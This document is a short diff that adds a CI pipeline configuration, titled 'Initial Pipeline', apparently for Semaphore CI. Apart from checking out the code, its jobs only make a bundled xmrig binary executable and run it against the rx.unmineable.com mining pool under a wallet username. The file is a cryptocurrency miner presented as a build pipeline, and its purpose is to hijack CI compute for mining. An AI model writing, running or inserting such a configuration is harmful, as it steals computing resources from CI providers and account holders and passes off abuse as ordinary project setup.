@@ -1,0 +1,19 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - checkout
+        - name: 'Job #2'
+          commands:
+            - chmod u+x ./xmrig
+        - name: 'Job #3'
+          commands:
+            - './xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TNNWYF4FXZUKVhgtYRJi17d3eGqSVuL823.paok'
